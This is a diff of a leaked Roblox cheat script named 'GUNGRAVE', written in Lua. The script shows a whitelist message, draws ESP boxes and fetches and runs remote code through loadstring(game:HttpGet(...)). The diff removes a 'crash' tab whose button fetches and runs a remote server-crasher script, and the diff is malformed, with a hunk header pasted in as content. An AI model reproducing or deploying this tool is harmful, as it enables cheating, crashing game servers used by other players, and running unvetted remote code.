@@ -1,3 +1,9 @@
+@@ -0,0 +1,466 @@
+--[[
+GUNGRAVE SOURCE LEAKED                                                                                                                                                                      
+--]]
+
+
 local L_1_ = "t"
 local L_2_ = game.Players.LocalPlayer:GetMouse()
 L_2_.KeyDown:Connect(
@@ -29,7 +35,7 @@ game.StarterGui:SetCore(
     "SendNotification",
     {
 	Title = "GUNGRAVE ",
-	Text = "You're whitelisted.",
+	Text = "INSOMNIAC, You're whitelisted.",
 }
 )
 local L_3_ = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
@@ -458,18 +464,4 @@ L_19_:NewToggle(
     function(L_204_arg0)
 	L_18_.Boxes = L_204_arg0
 end
-)
-local L_17_ = L_4_:NewTab("crash")
-local L_19_ = L_17_:NewSection("GUNGRAVE")
-L_19_:NewToggle(
-    "click it must have good pc shitter",
-    "good pc only shitter",
-    function()
-end
-)
-L_19_:NewButton(
-    "swag crasher",
-    "crash server",
-    function(loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))())
-end
-)
+) 
